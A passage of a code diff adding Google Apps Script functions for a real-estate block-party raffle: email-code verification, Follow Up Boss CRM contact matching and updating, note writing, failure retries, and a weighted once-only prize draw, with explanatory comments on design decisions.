+          'What happens if it does run out: codes, invites and reminders are refused and',
+          'the entrant is told to grab someone from TSG. Consents already given still',
+          'record. The 6:15 draw still runs and records the winner; only its email could fail.',
+          '',
+          'What you can do now: take entries on paper for the last stretch, and skip any',
+          'QA runs or Open House emails from this account for the rest of the day. The',
+          'console\'s "Raise the ceiling" button does NOT help here -- that is our own',
+          'six-hour cap; this is Google\'s daily one.',
+          'This alert is sent once.'
+        ].join('\n')
+      });
+      Logger.log('Raffle: quota run-out alert sent (' + left + ' left, ~' +
+                 Math.round(p.ratePerHour) + '/h).');
+    }
+    return p;
+  } catch (err) {
+    Logger.log('raffleWatchMailQuota_ failed (non-fatal): ' + err);
+    return null;
+  }
+}
+
+// readings: [{t, left}] oldest first, the first being the party's first reading.
+// Returns null until ten minutes of readings exist; otherwise the burn rate
+// (the faster of overall and recent), the projected remainder at close, when the
+// reserve would be reached, and whether that is before close.
+function raffleQuotaProjection_(readings, nowMs, closeMs, reserve) {
+  if (!readings || readings.length < 2) return null;
+  var latest = readings[readings.length - 1];
+  function rate(a, b) {
+    var dt = Number(b.t) - Number(a.t);
+    if (!(dt >= RAFFLE_QUOTA_RATE_MIN_MS)) return null;
+    return Math.max(0, Number(a.left) - Number(b.left)) / dt;   // recipients per ms
+  }
+  var overall = rate(readings[0], latest);
+  var recent  = readings.length >= 3 ? rate(readings[1], latest) : null;
+  if (overall === null && recent === null) return null;
+  var r = Math.max(overall || 0, recent || 0);
+  var left = Number(latest.left);
+  var projectedLeft = Math.round(left - r * (closeMs - nowMs));
+  var runsOutAt = r > 0 ? nowMs + Math.max(0, left - reserve) / r : Infinity;
+  return {
+    ratePerHour: r * 3600000,
+    projectedLeft: projectedLeft,
+    runsOutAt: runsOutAt,
+    alert: projectedLeft < reserve
+  };
+}
+
+// ---------- Step 2: confirm the code, then actually enter them ----------
+// Writes the entrant's OWN entry row, once, under the script lock.
+//
+// Called from TWO places, which is the whole reason it is a function: the code
+// path (raffleVerifyCode_) and the chain path (raffleChainStart_). A chain
+// entrant proved their inbox by clicking a link only it received, so they are a
+// verified entrant by a different route and must get the same one ticket -- the
+// chain email tells them they can enter, and for a while it handed them a
+// referral form without ever entering them.
+//
+// Idempotent on purpose: somebody who comes back to refer a second friend must
+// not collect a second self-entry.
+function raffleEnsureSelfEntry_(name, email, phone, personId, isTest) {
+  var selfLock = LockService.getScriptLock();
+  var haveSelfLock = false;
+  try { haveSelfLock = selfLock.tryLock(10000); } catch (lockErr) { haveSelfLock = false; }
+  try {
+    var emailKey = raffleEmailKey_(email), phoneKey = rafflePhoneKey_(phone);
+    var existingRows = raffleReadEntries_(isTest);
+    var alreadyHasSelfEntry = existingRows.some(function (r) {
+      return !r.isReferralRow &&
+        ((emailKey && r.emailKey === emailKey) || (phoneKey && r.phoneKey === phoneKey));
+    });
+    if (!alreadyHasSelfEntry) {
+      raffleAppendSelfEntry_(name, email, phone, personId || '', isTest);
+      if (raffleEntryState_() === 'open') raffleMaybeNotifyMilestone_(isTest);
+      return true;
+    }
+    return false;
+  } catch (selfErr) {
+    Logger.log('raffleEnsureSelfEntry_: self-entry write failed: ' + selfErr);
+    try {
+      sendErrorAlert('Raffle: self-entry row failed for ' + name,
+        'The entrant verified their email but their own entry row could not be ' +
+        'written, so they are NOT in the draw. Add them by hand.\n\n' +
+        name + ' / ' + email + ' / ' + phone + '\n\n' + selfErr);
+    } catch (alertErr) { /* never swallow the visitor's response */ }
+    return false;
+  } finally {
+    if (haveSelfLock) { try { selfLock.releaseLock(); } catch (relErr) { /* non-fatal */ } }
+  }
+}
+
+function raffleVerifyCode_(d, test) {
+  var cache = CacheService.getScriptCache();
+  var vid = String(d.vid || '');
+  if (!/^[0-9a-fA-F-]{36}$/.test(vid)) {
+    throw makeValidationError('That entry expired. Start again.');
+  }
+  var key = RAFFLE_PENDING_PREFIX + vid;
+  var raw = cache.get(key);
+  if (!raw) throw makeValidationError('That code expired. Start again and we will send a new one.');
+
+  var pending = JSON.parse(raw);
+  var supplied = String(d.code || '').replace(/\D/g, '');
+
+  if (supplied !== pending.code) {
+    pending.attempts = (pending.attempts || 0) + 1;
+    if (pending.attempts >= RAFFLE_CODE_MAX_ATTEMPTS) {
+      cache.remove(key);
+      throw makeValidationError('Too many wrong codes. Start again and we will send a new one.');
+    }
+    cache.put(key, JSON.stringify(pending), RAFFLE_CODE_TTL_SECONDS);
+    throw makeValidationError('That code is not right. Check your email and try again.');
+  }
+
+  // Verified. Everything below uses the CACHED values, never anything the client
+  // sent with this second request -- otherwise someone could verify one address
+  // and enter under a different one.
+  cache.remove(key);
+  var name = pending.name, email = pending.email, phone = pending.phone;
+  var isTest = !!pending.test;
+
+  // 2026-09-17, per Durand: "have the entrant enter all of their info and submit
+  // first, then if the entrant exists match to that fub contact, if not just
+  // create a new one, so the entrant never knows if they were in the database to
+  // begin with or not."
+  //
+  // So there is no lookup step and no "we found your record" screen. The entrant
+  // fills the form in, and the server resolves them against FUB silently:
+  // rafflePushToFub_ already does confident match-and-update (one match updates
+  // that contact additively, none creates, two+ creates and alerts a human), so
+  // an existing client is never duplicated and is never told they were found.
+  // The response below is byte-identical either way.
+  //
+  // This also means a visitor who verifies and then wanders off is still captured
+  // as a lead -- they gave their details and accepted the rules before the code
+  // was ever sent.
+  var fub = rafflePushToFub_(name, email, phone, isTest);
+  if (!fub.ok) {
+    try {
+      sendErrorAlert('Raffle: entrant FUB write failed for ' + name,
+        'The entrant verified their email but the FUB write failed. They can still ' +
+        'submit a referral -- the raffle row is written to the sheet independently ' +
+        'and raffleRetryFubFailures() can re-push afterwards.\n\n' + fub.error);
+    } catch (alertErr) { Logger.log('Raffle FUB alert failed: ' + alertErr); }
+  }
+
+  // YOU ARE NOW ENTERED. One ticket, the moment the code comes back.
+  //
+  // This is the change that removes the catastrophic case: while a confirmed
+  // referral was REQUIRED, a weekend where nobody's referral replied meant no
+  // entrants and no drawing. Verification is proof of a real person with a real
+  // inbox who accepted the rules, which is enough to be in the draw. A confirmed
+  // referral is then worth RAFFLE_BONUS_TICKETS_PER_REFERRAL more.
+  //
+  // Written under the lock and only once per person: somebody who comes back to
+  // refer a second friend must not collect a second self-entry.
+  raffleEnsureSelfEntry_(name, email, phone, (fub && fub.personId) || '', isTest);
+
+  // The verified session. This is what proves, on the NEXT request, that whoever
+  // is submitting a referral owns the email address it will be attributed to.
+  var session = {
+    name: name, email: email, phone: phone,
+    personId: (fub && fub.personId) || '',
+    test: isTest, verifiedAt: raffleFmt_(raffleNow_())
+  };
+  cache.put(RAFFLE_VERIFIED_PREFIX + vid, JSON.stringify(session),
+            RAFFLE_VERIFIED_TTL_SECONDS);
+
+  return jsonOut({
+    ok: true,
+    verified: true,
+    vid: vid,
+    firstName: String(name).split(' ')[0],
+    message: 'You are in, ' + String(name).split(' ')[0] + '. Now multiply your odds: ' +
+      'refer one person and you get ' + RAFFLE_BONUS_TICKETS_PER_REFERRAL + ' more entries.'
+  });
+}
+
+function raffleAppendEntry_(name, email, phone, test) {
+  var sh = raffleSheet_(test);
+  // Every value below that came from the entrant goes through raffleSafeCell_,
+  // which prefixes Sheets' text marker to anything starting = + - @ so a typed
+  // formula is stored as text instead of executing when the sheet is opened.
+  sh.appendRow([
+    raffleFmt_(raffleNow_()),
+    raffleSafeCell_(name), raffleSafeCell_(email), raffleSafeCell_(phone),
+    'Yes', RAFFLE_CONSENT_VERSION,
+    test ? (QA_TEST_PREFIX + RAFFLE_EVENT_NAME) : RAFFLE_EVENT_NAME,
+    'pending', '', 'Yes', 'Yes (code confirmed)'
+  ]);
+  return { row: sh.getLastRow() };
+}
+
+function raffleRecordFubOutcome_(row, fub, test) {
+  var sh = raffleSheet_(test);
+  sh.getRange(row, 8).setValue(fub.ok ? 'ok' : ('failed: ' + String(fub.error).slice(0, 200)));
+  if (fub.personId) sh.getRange(row, 9).setValue(fub.personId);
+}
+
+// Reads every entry row into objects. Small by construction (the party is
+// capped at 125), so a full read per submission is cheap and keeps the
+// duplicate check reading the same source of truth the draw will.
+function raffleReadEntries_(test) {
+  var sh = raffleSheet_(test);
+  var last = sh.getLastRow();
+  if (last < 2) return [];
+  var values = sh.getRange(2, 1, last - 1, RAFFLE_SHEET_HEADERS.length).getValues();
+  var out = [];
+  values.forEach(function (r, idx) {
+    // Sheets normally consumes the leading apostrophe raffleSafeCell_ writes, so
+    // this is belt-and-braces: strip it on read too, and the value is identical
+    // either way. Without it a neutralized cell would key differently from the
+    // same address typed again.
+    var unmark = function (v) { return String(v || '').replace(/^'/, '').trim(); };
+    var name = unmark(r[1]);
+    if (!name) return;
+    if (String(r[9] || 'Yes').toLowerCase() === 'no') return; // manually disqualified
+    out.push({
+      row: idx + 2,
+      timestamp: r[0],
+      name: name,
+      email: unmark(r[2]),
+      phone: unmark(r[3]),
+      emailKey: raffleEmailKey_(unmark(r[2])),
+      phoneKey: rafflePhoneKey_(unmark(r[3])),
+      fubStatus: String(r[7] || ''),
+      fubId: unmark(r[8]),
+      // A row written before the referral change has an empty Entry Status.
+      // Those rows were real entries under the old rules, so they read as
+      // eligible rather than being silently dropped from the draw.
+      status: String(r[RAFFLE_COL['Entry Status']] || RAFFLE_STATUS_ELIGIBLE),
+      referralName:  unmark(r[RAFFLE_COL['Referral Name']]),
+      referralEmail: unmark(r[RAFFLE_COL['Referral Email']]),
+      referralPhone: unmark(r[RAFFLE_COL['Referral Phone']]),
+      referralRole:  unmark(r[RAFFLE_COL['Referral Role']]),
+      referralEmailKey: raffleEmailKey_(unmark(r[RAFFLE_COL['Referral Email']])),
+      referralPhoneKey: rafflePhoneKey_(unmark(r[RAFFLE_COL['Referral Phone']])),
+      referralFubId: unmark(r[RAFFLE_COL['Referral FUB ID']]),
+      referralLoggedAt: unmark(r[RAFFLE_COL['Referral Logged At']]),
+      referralEmailedAt: unmark(r[RAFFLE_COL['Referral Emailed At']]),
+      chainToken: unmark(r[RAFFLE_COL['Chain Token']]),
+      chainEmailedAt: unmark(r[RAFFLE_COL['Chain Emailed At']]),
+      reminderSentAt: unmark(r[RAFFLE_COL['Reminder Sent At']]),
+      referralTimeframe: unmark(r[RAFFLE_COL['Referral Timeframe']]),
+      consentToken: unmark(r[RAFFLE_COL['Consent Token']]),
+      // Derived rather than stored: a stored count would need migrating and could
+      // drift from the row it describes.
+      isReferralRow: !!unmark(r[RAFFLE_COL['Referral Name']]),
+      tickets: unmark(r[RAFFLE_COL['Referral Name']]) ? RAFFLE_BONUS_TICKETS_PER_REFERRAL : 1
+    });
+  });
+  return out;
+}
+
+// ---------- FUB ----------
+// Per Durand 2026-09-16, this does NOT create-and-tag-duplicates the way the
+// other forms do. It matches an existing contact confidently, UPDATES it with
+// whatever is new, and preserves what was there as a note. Rationale: FUB does
+// not merge on email, so a create always makes a second record -- which means
+// the raffle tags would land on a brand-new empty record while the real contact,
+// with all its history, got nothing.
+//
+// MATCH CONFIDENCE. Wrongly merging two different people corrupts real CRM data,
+// so this is deliberately conservative. A candidate is confident only when:
+//   email matches AND (last name OR first name OR phone also matches)
+//   -- or --
+//   phone matches AND BOTH first and last name match
+// Email alone is NOT enough, and phone alone is NOT enough: a couple sharing one
+// address or one mobile is the common case, and they are two different people.
+// If two or more candidates clear the bar, that is ambiguous, not confident --
+// nothing is updated, a new contact is created, and Durand is told so he can
+// merge by hand. Names are compared exactly (normalized); no nickname guessing,
+// because over-matching is the expensive direction here.
+function raffleNorm_(v) {
+  return String(v || '').trim().toLowerCase().replace(/[^a-z0-9]/g, '');
+}
+
+function raffleFubGet_(url, apiKey) {
+  var resp = UrlFetchApp.fetch(url, {
+    method: 'get',
+    headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
+    muteHttpExceptions: true
+  });
+  if (resp.getResponseCode() < 200 || resp.getResponseCode() >= 300) return null;
+  try { return JSON.parse(resp.getContentText()); } catch (err) { return null; }
+}
+
+// Everything FUB knows that could be this person, by email or by phone.
+function raffleFindCandidates_(email, phoneDigits, apiKey) {
+  var byId = {};
+  [
+    'https://api.followupboss.com/v1/people?email=' + encodeURIComponent(email),
+    'https://api.followupboss.com/v1/people?phone=' + encodeURIComponent(phoneDigits)
+  ].forEach(function (url) {
+    var body = raffleFubGet_(url, apiKey);
+    ((body && body.people) || []).forEach(function (p) {
+      if (p && (p.id || p.id === 0)) byId[p.id] = p;
+    });
+  });
+  return Object.keys(byId).map(function (k) { return byId[k]; });
+}
+
+function raffleScoreCandidate_(p, first, last, email, phoneDigits) {
+  var emails = (p.emails || []).map(function (e) { return raffleNorm_(e && e.value); });
+  var phones = (p.phones || []).map(function (x) { return rafflePhoneKey_(x && x.value); });
+  var m = {
+    email: emails.indexOf(raffleNorm_(email)) !== -1,
+    phone: phones.indexOf(rafflePhoneKey_(phoneDigits)) !== -1,
+    first: !!raffleNorm_(first) && raffleNorm_(p.firstName) === raffleNorm_(first),
+    last:  !!raffleNorm_(last)  && raffleNorm_(p.lastName)  === raffleNorm_(last)
+  };
+  m.confident = (m.email && (m.last || m.first || m.phone)) ||
+                (m.phone && m.first && m.last);
+  m.why = Object.keys(m).filter(function (k) { return k !== 'confident' && k !== 'why' && m[k]; }).join('+');
+  return m;
+}
+
+// Union of two {value:...} lists, keyed by a normalizer, first list winning.
+function raffleMergeValues_(existing, incoming, keyFn) {
+  var out = (existing || []).slice();
+  var seen = {};
+  out.forEach(function (e) { seen[keyFn(e && e.value)] = true; });
+  (incoming || []).forEach(function (e) {
+    var k = keyFn(e && e.value);
+    if (k && !seen[k]) { out.push(e); seen[k] = true; }
+  });
+  return out;
+}
+
+function rafflePushToFub_(name, email, phone, test) {
+  try {
+    var apiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+    if (!apiKey) return { ok: false, error: 'FUB_API_KEY script property is not set.' };
+
+    var parts  = splitName(name);
+    var first  = parts.first, last = parts.last;
+    var digits = String(phone || '').replace(/\D/g, '');
+    var tags   = test ? RAFFLE_TAGS.concat([QA_TEST_TAG]) : RAFFLE_TAGS.slice();
+
+    // ---- 1. Try to recognise them ----
+    var confident = [];
+    try {
+      raffleFindCandidates_(email, digits, apiKey).forEach(function (p) {
+        var m = raffleScoreCandidate_(p, first, last, email, digits);
+        if (m.confident) confident.push({ person: p, why: m.why });
+      });
+    } catch (searchErr) {
+      Logger.log('Raffle FUB candidate search failed (falling back to create): ' + searchErr);
+    }
+
+    if (confident.length === 1) {
+      return raffleUpdateExistingFub_(confident[0], name, first, last, email, phone, digits, tags, apiKey, test);
+    }
+    if (confident.length > 1) {
+      // Ambiguous is not confident. Do not guess which record is the real one.
+      try {
+        sendErrorAlert('Raffle: ambiguous FUB match for ' + name,
+          'More than one FUB contact matched confidently, so NOTHING was updated and a new ' +
+          'contact was created instead. Merge by hand in FUB:\n\n' +
+          confident.map(function (c) {
+            return '  #' + c.person.id + '  ' + (c.person.firstName || '') + ' ' +
+                   (c.person.lastName || '') + '  (matched on ' + c.why + ')\n' +
+                   '  https://' + FUB_SUBDOMAIN + '.followupboss.com/2/people/view/' + c.person.id;
+          }).join('\n\n'));
+      } catch (alertErr) { Logger.log('Ambiguous-match alert failed: ' + alertErr); }
+    }
+
+    // ---- 2. Nobody recognised: create, as before ----
+    var payload = {
+      firstName: (test ? QA_TEST_PREFIX : '') + first,
+      lastName: last,
+      source: RAFFLE_SOURCE,
+      tags: tags,
+      emails: [{ value: email }],
+      phones: [{ value: digits }],
+      background: (test ? (QA_TEST_BACKGROUND_LEAD_IN + '\n\n') : '') +
+                  raffleBackground_(name, email, phone)
+    };
+    payload[CONSENT_CUSTOM_FIELD] = Utilities.formatDate(raffleNow_(), RAFFLE_TZ, 'yyyy-MM-dd');
+
+    var resp = UrlFetchApp.fetch('https://api.followupboss.com/v1/people', {
+      method: 'post',
+      contentType: 'application/json',
+      headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
+      payload: JSON.stringify(payload),
+      muteHttpExceptions: true
+    });
+    var code = resp.getResponseCode();
+    if (code < 200 || code >= 300) {
+      return { ok: false, error: 'FUB /v1/people returned ' + code + ': ' + resp.getContentText().slice(0, 400) };
+    }
+    var personId = null;
+    try { personId = JSON.parse(resp.getContentText()).id; } catch (parseErr) { /* non-fatal */ }
+    if (personId) {
+      try { raffleAddNote_(personId, name, apiKey, test); }
+      catch (noteErr) { Logger.log('Raffle note failed for person ' + personId + ': ' + noteErr); }
+    }
+    return { ok: true, personId: personId, created: true };
+
+  } catch (err) {
+    return { ok: false, error: 'FUB fetch threw: ' + (err && err.message ? err.message : String(err)) };
+  }
+}
+
+// Confident match: fold the new information into the record that already exists,
+// and keep the previous values as a note so nothing is silently overwritten.
+function raffleUpdateExistingFub_(match, name, first, last, email, phone, digits, tags, apiKey, test) {
+  var id = match.person.id;
+
+  // Re-read the full record: the search result is a summary, and tags/emails/
+  // phones have to be merged against what is actually there or the PUT wipes them.
+  var cur = raffleFubGet_('https://api.followupboss.com/v1/people/' + id, apiKey) || match.person;
+  var before = {
+    firstName: cur.firstName || '',
+    lastName:  cur.lastName || '',
+    emails: (cur.emails || []).map(function (e) { return e && e.value; }).filter(String),
+    phones: (cur.phones || []).map(function (p) { return p && p.value; }).filter(String),
+    tags:   (cur.tags || []).slice(),
+    source: cur.source || ''
+  };
+
+  var mergedTags = before.tags.slice();
+  tags.forEach(function (t) { if (mergedTags.indexOf(t) === -1) mergedTags.push(t); });
+
+  var payload = {
+    // Additive only. An existing address or number is never replaced -- the new
+    // one is appended, so a second email or a mobile we did not have is gained
+    // rather than the old one being destroyed.
+    emails: raffleMergeValues_(cur.emails, [{ value: email }], raffleNorm_),
+    phones: raffleMergeValues_(cur.phones, [{ value: digits }], rafflePhoneKey_),
+    tags: mergedTags
+  };
+  // Fill a blank name, never overwrite one that is already set: the CRM's version
+  // of someone's name is likelier to be right than what they thumbed in at a party.
+  if (!before.firstName && first) payload.firstName = (test ? QA_TEST_PREFIX : '') + first;
+  if (!before.lastName && last)   payload.lastName = last;
+  // Their original lead source is history and is deliberately left alone; the
+  // raffle tags are what record that they came through this event.
+  payload[CONSENT_CUSTOM_FIELD] = Utilities.formatDate(raffleNow_(), RAFFLE_TZ, 'yyyy-MM-dd');
+
+  var resp = UrlFetchApp.fetch('https://api.followupboss.com/v1/people/' + id, {
+    method: 'put',
+    contentType: 'application/json',
+    headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
+    payload: JSON.stringify(payload),
+    muteHttpExceptions: true
+  });
+  var code = resp.getResponseCode();
+  if (code < 200 || code >= 300) {
+    return { ok: false, error: 'FUB PUT /v1/people/' + id + ' returned ' + code + ': ' +
+                               resp.getContentText().slice(0, 400) };
+  }
+
+  var addedEmail = before.emails.map(raffleNorm_).indexOf(raffleNorm_(email)) === -1;
+  var addedPhone = before.phones.map(rafflePhoneKey_).indexOf(rafflePhoneKey_(digits)) === -1;
+  var addedTags  = mergedTags.filter(function (t) { return before.tags.indexOf(t) === -1; });
+
+  try { raffleAddNote_(id, name, apiKey, test, { before: before, match: match.why,
+        addedEmail: addedEmail ? email : null, addedPhone: addedPhone ? phone : null,
+        addedTags: addedTags }); }
+  catch (noteErr) { Logger.log('Raffle update note failed for person ' + id + ': ' + noteErr); }
+
+  Logger.log('Raffle: UPDATED existing FUB contact ' + id + ' (matched on ' + match.why + ').');
+  return { ok: true, personId: id, updated: true, matchedOn: match.why };
+}
+
+function raffleBackground_(name, email, phone) {
+  return [
+    'Entered the ' + RAFFLE_EVENT_NAME + ' prize drawing (' + RAFFLE_PRIZE_SHORT + ').',
+    'ATTENDED the TSG Block Party on Saturday, September 19, 2026 (1342 N Hancock St, Philadelphia).',
+    '',
+    'Entry submitted: ' + raffleFmt_(raffleNow_()) + ' ET',
+    'Name: ' + name,
+    'Email: ' + email,
+    'Phone: ' + phone,
+    '',
+    'EMAIL VERIFIED: this address was confirmed at entry -- a 6-digit code was',
+    'emailed to it and typed back before the entry was accepted. The phone number',
+    'was format- and plausibility-checked but NOT ownership-verified (no SMS).',
+    '',
+    'CONSENT: accepted the Official Rules and gave express written consent to be',
+    'contacted by call, text and email (including autodialed/prerecorded messages)',
+    'about real estate services. Consent language version: ' + RAFFLE_CONSENT_VERSION + '.'
+  ].join('\n');
+}
+
+function raffleAddNote_(personId, name, apiKey, test, upd) {
+  var lines = [
+    'Met at the TSG Block Party, Sat 9/19/2026, 1342 N Hancock St. Entered the ' +
+    RAFFLE_PRIZE_SHORT + ' drawing and consented to follow-up.',
+    'Email address was verified at entry (a code was emailed and typed back).'
+  ];
+
+  if (upd) {
+    // The whole point of the update path: whatever this overwrote or added is
+    // written down here, so the record's previous state is never just lost.
+    lines.push('', 'RECOGNISED AN EXISTING CONTACT — matched on ' + upd.match + '.',
+                   'This entry UPDATED that contact rather than creating a second record.');
+    var changes = [];
+    if (upd.addedEmail) changes.push('  + email added: ' + upd.addedEmail);
+    if (upd.addedPhone) changes.push('  + phone added: ' + upd.addedPhone);
+    if (upd.addedTags && upd.addedTags.length) changes.push('  + tags added: ' + upd.addedTags.join(', '));
+    lines.push('', changes.length ? 'What this entry added:' : 'Nothing new to add — we already had all of it.');
+    if (changes.length) lines = lines.concat(changes);
+
+    var b = upd.before || {};
+    lines.push('', 'CONTACT AS IT WAS BEFORE THIS ENTRY (nothing here was removed):',
+      '  Name:   ' + [b.firstName, b.lastName].join(' ').trim(),
+      '  Emails: ' + ((b.emails || []).join(', ') || '(none)'),
+      '  Phones: ' + ((b.phones || []).join(', ') || '(none)'),
+      '  Tags:   ' + ((b.tags || []).join(', ') || '(none)'),
+      '  Source: ' + (b.source || '(none)') + '  [left unchanged — original lead source is history]',
+      '', 'Entered as: ' + name + ' / ' + (upd.addedEmail || '(existing email)') + ' / ' +
+          (upd.addedPhone || '(existing phone)'));
+  } else {
+    lines.push('', 'New contact — no existing FUB record matched confidently on name + email + phone.',
+                   'Warm event lead — worth a personal call, not just a drip.');
+  }
+
+  var resp = UrlFetchApp.fetch('https://api.followupboss.com/v1/notes', {
+    method: 'post',
+    contentType: 'application/json',
+    headers: { Authorization: 'Basic ' + Utilities.base64Encode(apiKey + ':') },
+    payload: JSON.stringify({
+      personId: personId,
+      subject: (test ? QA_TEST_PREFIX : '') + 'Block Party 2026 — raffle entry' +
+               (upd ? ' (updated existing contact)' : ''),
+      body: lines.join('\n'),
+      isHtml: false
+    }),
+    muteHttpExceptions: true
+  });
+  var code = resp.getResponseCode();
+  if (code < 200 || code >= 300) {
+    Logger.log('Raffle note POST returned ' + code + ': ' + resp.getContentText().slice(0, 300));
+  }
+}
+
+// Re-pushes any entry whose FUB write failed. Safe to run repeatedly — it only
+// touches rows still marked failed, and rewrites their status on success.
+function raffleRetryFubFailures() {
+  var rows = raffleReadEntries_().filter(function (r) {
+    return r.fubStatus.indexOf('failed') === 0 || r.fubStatus === 'pending';
+  });
+  var fixed = 0;
+  rows.forEach(function (r) {
+    var res = rafflePushToFub_(r.name, r.email, r.phone);
+    raffleRecordFubOutcome_(r.row, res);
+    if (res.ok) fixed++;
+  });
+  var msg = 'Retried ' + rows.length + ' entries; ' + fixed + ' now in FUB.';
+  Logger.log(msg);
+  return msg;
+}
+
+// ---------- The draw ----------
+function raffleStoredWinner_(test) {
+  var raw = PropertiesService.getScriptProperties().getProperty(raffleWinnerProp_(test));
+  if (!raw) return null;
+  try { return JSON.parse(raw); } catch (err) { return null; }
+}
+
+// Deliberately NOT repeatable. Once a winner is recorded it is returned as-is
+// on every subsequent call, so a double-fired trigger, a refreshed admin page
+// or a second tap can never re-roll a drawing that has already happened.
+// `force` exists because the draw is deliberately once-only: whoever it lands
+// on is the winner, and the only way back is raffleResetDrawDANGER() from the
+// editor. That makes an accidental early tap on the admin bookmark -- at 4pm,
+// with an hour of entries still to come and one name in the sheet -- expensive
+// and embarrassing in a way nothing else here is. So a LIVE draw before the
+// close time now has to be asked for twice (&force=1 on the admin URL).
+//
+// The 6:15 trigger passes force itself, so the real draw is never blocked by a
+// few seconds' clock skew, and test mode is exempt entirely: rehearsing the
+// draw at any hour is the whole point of the test tab.
+function raffleDrawWinner_(test, force) {
+  var props = PropertiesService.getScriptProperties();
+  var existing = raffleStoredWinner_(test);
+  if (existing) return { ok: true, alreadyDrawn: true, result: existing };
+
+  if (!test && !force && Date.now() < new Date(RAFFLE_CLOSE_AT).getTime()) {
+    return { ok: false, error: 'Entries are still open until ' +
+      raffleFmt_(new Date(RAFFLE_CLOSE_AT)) + ' ET, and the draw cannot be undone ' +
+      'once it runs. If you really mean to draw now, add &force=1 to this URL.' };
+  }
+
+  var lock = LockService.getScriptLock();
+  if (!lock.tryLock(20000)) return { ok: false, error: 'Could not acquire the draw lock; try again.' };
+  try {
+    existing = raffleStoredWinner_(test);          // re-read inside the lock
+    if (existing) return { ok: true, alreadyDrawn: true, result: existing };
+
+    // Only rows that are actually worth something: an own entry (eligible the
+    // moment the email was verified) or a referral the referred person actually
+    // consented to. A pending-consent row earns nothing -- the entrant was told
+    // plainly that the bonus lands when their referral says yes, and the draw
+    // has to mean that.
+    var entries = raffleReadEntries_(test).filter(function (e) {
+      return e.status === RAFFLE_STATUS_ELIGIBLE;
+    });
+    if (!entries.length) {
+      return { ok: false, error: 'No eligible entries — nothing to draw.' };
+    }
+
+    // WEIGHTED DRAW. Every eligible row becomes as many tickets as it is worth:
+    // one for entering, RAFFLE_BONUS_TICKETS_PER_REFERRAL for a referral who
+    // confirmed. The shuffle then runs over TICKETS, so somebody with a confirmed
+    // referral genuinely has six times the chance rather than a nominal bonus.
+    var tickets = [];
+    entries.forEach(function (e) {
+      var n = Math.max(1, Number(e.tickets) || 1);
+      for (var t = 0; t < n; t++) tickets.push(e);
+    });
+
+    // Fisher-Yates over the ticket list, then de-duplicated by person below: the
+    // winner is the first ticket drawn, and the backups are the next DIFFERENT
+    // people, so one entrant cannot occupy two of the three picks just because
+    // they hold more tickets.
+    for (var i = tickets.length - 1; i > 0; i--) {
+      var j = Math.floor(Math.random() * (i + 1));
+      var tmp = tickets[i]; tickets[i] = tickets[j]; tickets[j] = tmp;
+    }
+    var pool = [], seen = {};
+    tickets.forEach(function (e) {
+      var key = e.emailKey || ('row' + e.row);
+      if (seen[key]) return;
+      seen[key] = true;
+      pool.push(e);
+    });
+
+    // Carries the FUB ids and the referral, not just a name: the ops email links
+    // straight through to both records, and the draw console shows who each pick
+    // actually referred. Reading it back off the sheet later would be too late --
+    // the stored draw record IS the audit trail.
+    var slim = function (e) {
+      return {
+        name: e.name, email: e.email, phone: e.phone, row: e.row,
+        fubId: e.fubId || '',
+        referralName: e.referralName || '', referralEmail: e.referralEmail || '',
+        referralPhone: e.referralPhone || '', referralRole: e.referralRole || '',
+        referralTimeframe: e.referralTimeframe || '', referralFubId: e.referralFubId || ''
+      };
+    };
+    var result = {
+      test: !!test,
+      drawnAt: raffleFmt_(raffleNow_()),
+      totalEligible: entries.length,
+      // Both numbers, because they answer different questions: how many entries
+      // there were, and how many chances were in the draw.
+      totalTickets: tickets.length,
+      totalPeople: pool.length,
+      winner: slim(pool[0]),
+      backups: pool.slice(1, 1 + RAFFLE_BACKUP_COUNT).map(slim)
+    };
+
+    props.setProperty(raffleWinnerProp_(test), JSON.stringify(result));
+
+    // Entries are closed and the result is recorded, so every referral still
+    // unanswered is now definitively unanswered. Sweep them into FUB, flagged --
+    // see raffleLogUnconfirmedReferrals_. Best-effort: a CRM problem must never
+    // put the draw itself at risk, since the draw has already happened by here.
+    try { raffleLogUnconfirmedReferrals_(test); }
+    catch (sweepErr) { Logger.log('Unconfirmed-referral sweep failed: ' + sweepErr); }
+    try { raffleWriteDrawTab_(result, test); } catch (tabErr) { Logger.log('Draw tab write failed: ' + tabErr); }
+    try { raffleEmailResult_(result, test); } catch (mailErr) {
+      Logger.log('Draw email failed: ' + mailErr);
+      return { ok: true, alreadyDrawn: false, result: result, emailFailed: true };
+    }
+    return { ok: true, alreadyDrawn: false, result: result };
+  } finally {
+    try { lock.releaseLock(); } catch (releaseErr) { /* non-fatal */ }
+  }
+}
+
+// The 6:15 trigger target. Thin on purpose: all the logic (and the
+// already-drawn guard) lives in raffleDrawWinner_.
+function raffleScheduledDraw() {
+  var res = raffleDrawWinner_(false, true);   // the 6:15 trigger is always the LIVE draw
+  if (!res.ok) {
+    Logger.log('Scheduled draw did not complete: ' + res.error);
+    try {
+      sendErrorAlert('Raffle: 6:15 draw did NOT complete', res.error +
+        '\n\nDraw manually from the admin link (raffleAdminLinks() in the editor).');
+    } catch (alertErr) { /* nothing more we can do */ }
+  }
+}
+
+function raffleWriteDrawTab_(result, test) {
+  var ss = SpreadsheetApp.openById(
+    PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP));
+  var tab = test ? 'Draw Result (TEST)' : 'Draw Result';
+  var sh = ss.getSheetByName(tab) || ss.insertSheet(tab);
+  sh.clear();
+  var rows = [
+    ['Event', (test ? QA_TEST_PREFIX : '') + RAFFLE_EVENT_NAME],
+    ['Prize', RAFFLE_PRIZE_SHORT],
+    ['Drawn at (ET)', result.drawnAt],
+    ['Eligible entries', result.totalEligible],
+    ['People in the draw', result.totalPeople],
+    ['Tickets in the draw', result.totalTickets],
+    [],
+    ['WINNER', result.winner.name],
+    ['Phone', result.winner.phone],
+    ['Email', result.winner.email]
+  ];
+  result.backups.forEach(function (b, i) {
+    rows.push([], ['Backup ' + (i + 1), b.name], ['Phone', b.phone], ['Email', b.email]);
+  });
+  sh.getRange(1, 1, rows.length, 2).setValues(rows.map(function (r) {
+    return [r[0] === undefined ? '' : r[0], r[1] === undefined ? '' : r[1]];
+  }));
+  sh.getRange(8, 1, 1, 2).setFontWeight('bold').setFontSize(14);   // the WINNER row
+}
+
+function raffleEmailResult_(result, test) {
